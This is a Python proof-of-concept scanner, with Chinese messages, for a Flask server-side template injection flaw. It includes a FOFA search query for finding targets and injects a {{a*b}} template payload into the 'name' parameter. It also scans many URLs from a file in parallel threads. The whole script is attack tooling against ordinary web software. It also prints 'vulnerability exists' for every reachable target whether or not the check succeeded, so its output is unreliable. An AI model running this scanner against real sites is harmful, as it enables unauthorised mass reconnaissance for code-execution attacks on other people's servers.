#FOFA: app="Flask"

import urllib
import requests
import re
import argparse
import urllib3
from multiprocessing.dummy import Pool
import random

urllib3.disable_warnings()

proxy = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}

def banner():
    info = """
   _____                __          __        _        _                 
  / ____|               \ \        / /       | |      | |                
 | |  __ _ __ __ _ ___ __\ \  /\  / /__  _ __| | _____| |__   ___  _ __  
 | | |_ | '__/ _` / __/ __\ \/  \/ / _ \| '__| |/ / __| '_ \ / _ \| '_ \ 
 | |__| | | | (_| \__ \__ \\  /\  / (_) | |  |   <\__ \ | | | (_) | |_) |
  \_____|_|  \__,_|___/___/ \/  \/ \___/|_|  |_|\_\___/_| |_|\___/| .__/ 
                                                                  | |    
                                                                  |_|    
"""
    print(info)

def poc(target):
    relsult = {
        'name': 'Flask-ssti 代码执行漏洞',
        'vulnerable': False,
        'attack': True,
    }
    try:
        rand_num1 = random.randint(1000, 9999)
        rand_num2 = random.randint(1000, 9999)
        payload = r'/?name={{%d*%d}}' % (rand_num1, rand_num2)
        rand_product = rand_num1 * rand_num2
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
        }
        vurl = urllib.parse.urljoin(target, payload)
        req = requests.get(vurl, headers=headers, timeout=3)
        if re.search(str(rand_product), req.text):
            relsult['vulnerable'] = True
            relsult['method'] = 'GET'
            relsult['url'] = target
            relsult['payload'] = vurl
        print (f"存在漏洞：{relsult}")
    except:
        print (f"{target}访问失败")

def main():
    parser = argparse.ArgumentParser("Flask-ssti代码执行漏洞检测POC")
    parser.add_argument("-u", "--url", dest="url", help="Insert URL")
    parser.add_argument("-f", "--file", dest="file", help="Insert URLs file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r') as uf:
            urls = []
            for u in uf.readlines():
                urls.append(u.strip())
            mp = Pool(10)
            mp.map(poc, urls)
            mp.close()
            mp.join()
    else:
        print("输入有误，请检查")

if __name__ == '__main__':
    banner()
    main()
